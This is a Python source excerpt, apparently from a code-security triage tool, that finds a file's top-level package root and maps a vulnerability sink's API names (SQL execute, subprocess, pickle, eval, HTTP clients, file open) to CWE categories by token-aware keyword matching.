    """Walk up from ``file_dir`` over consecutive ``__init__.py``-bearing dirs.

    Returns ``(top_package_dir, sys_path_dir)`` -- the highest ancestor that is a
    Python package (whose parent is NOT a package) and the directory to place on
    ``sys.path`` (the package's parent). ``(None, None)`` when ``file_dir`` is not
    inside any package. This is what makes a ``src``-layout / monorepo file
    (``packages/foo/src/foo_pkg/mod.py``) resolve to the real importable package
    ``foo_pkg`` rooted at ``.../src`` rather than an un-importable hyphenated path
    rooted at the repo."""
    cur = os.path.abspath(file_dir) if file_dir else ''
    top = None
    while cur and os.path.isdir(cur):
        if os.path.isfile(os.path.join(cur, '__init__.py')):
            top = cur
            parent = os.path.dirname(cur)
            if parent == cur:
                break
            cur = parent
        else:
            break
    if top is not None:
        return (top, os.path.dirname(top))
    return (None, None)
_SINK_CWE_RULES: tuple = (('CWE-89', ('cursor.execute', 'executescript', 'executemany', '.execute', '.raw', 'rawquery')), ('CWE-78', ('create_subprocess_exec', 'create_subprocess_shell', 'subprocess', 'system', 'popen', 'check_output', 'check_call', 'getoutput', 'getstatusoutput', 'commands', 'spawn')), ('CWE-502', ('pickle', 'cpickle', 'marshal', 'yaml.load', 'yaml.unsafe_load', 'jsonpickle', 'shelve')), ('CWE-94', ('eval', 'exec', 'compile', '__import__', 'literal_eval', 'compile_restricted', 'restrictedpython')), ('CWE-918', ('requests', 'urllib', 'urlopen', 'urlretrieve', 'httpx', 'aiohttp', 'socket', 'http.client')), ('CWE-22', ('send_file', 'sendfile', 'extractall', 'os.path.join', 'safe_join', 'pathlib', 'shutil.copy', 'open')))

def sink_to_cwe(sink_name: Any, call_sites: Any) -> Optional[str]:
    """Classify a concrete sink (``sink_name`` + ``call_sites`` idioms) to its
    canonical CWE template family, or ``None`` when there is no confident match.

    The declared finding category is frequently a mis-triage (e.g. a
    ``asyncio.create_subprocess_exec`` sink declared CWE-22), so the TRUE sink
    semantics -- not the label -- pick the template. Returns ``None`` (no
    override) when no hint is present or the sink matches no family, so the
    caller falls back to the declared category.

    Matching is token-aware: identifiers are tokenized on non-word boundaries so
    a short keyword like ``exec`` matches the standalone ``eval``/``exec`` sink
    but NOT ``cursor.execute`` (which the SQLi rule, ordered first and matched on
    its dotted/qualified idioms, claims instead). Rule order disambiguates the
    overlaps: SQLi ``.execute`` before command-exec, deserialization before the
    bare code-injection ``load``, and the broad path-``open`` / SSRF idioms last.
    """
    parts: List[str] = []
    if sink_name:
        parts.append(str(sink_name))
    for site in call_sites or []:
        if str(site).strip():
            parts.append(str(site))
    blob = ' '.join(parts).lower()
    if not blob.strip():
        return None
    tokens = set(re.findall('[a-z_][a-z0-9_]*', blob))
    for cwe, needles in _SINK_CWE_RULES:
        for needle in needles:
            if '.' in needle or needle.startswith('_'):
                if needle.lstrip('.') in blob:
                    return cwe
            elif needle in tokens:
                return cwe
    return None